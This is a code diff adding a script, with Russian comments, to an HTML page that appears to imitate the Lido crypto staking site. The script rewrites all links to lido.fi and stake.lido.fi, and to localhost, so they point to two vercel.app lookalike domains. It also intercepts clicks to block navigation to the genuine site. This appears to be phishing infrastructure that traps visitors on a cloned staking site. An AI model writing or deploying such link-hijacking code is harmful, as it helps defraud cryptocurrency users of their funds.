@@ -221,4 +221,35 @@
   console.log('HOTFIX LOGO vs STAKE ACTIVE');
 })();
 </script>
-</body></html>
+
+<script>
+/* VERCEL LINK GUARD ACTIVE */
+(function(){
+  var MAIN='https://lido-web-mine-site.vercel.app', STAKE='https://lido-web-stake-site.vercel.app';
+
+  function map(url){
+    try{
+      var s=String(url||'');
+      if (/^https?:\/\/localhost:8000\b/.test(s)) return MAIN+'/';
+      if (/^https?:\/\/localhost:8001\b/.test(s)) return STAKE+'/';
+      if (/^https?:\/\/(?:www\.)?lido\.fi\/?$/i.test(s)) return MAIN+'/';
+      if (/^https?:\/\/(?:www\.)?stake\.lido\.fi/i.test(s)) return STAKE+'/';
+    }catch(_){}
+    return null;
+  }
+
+  // перепишем href у всех ссылок
+  document.querySelectorAll('a[href]').forEach(function(a){
+    var next = map(a.getAttribute('href')||'');
+    if (next) a.setAttribute('href', next);
+  });
+
+  // перехват кликов (capture)
+  document.addEventListener('click', function(e){
+    var a = e.target.closest && e.target.closest('a[href]');
+    if (!a) return;
+    var next = map(a.getAttribute('href')||'');
+    if (next){ e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation(); location.href = next; }
+  }, true);
+})();
+</script></body></html>
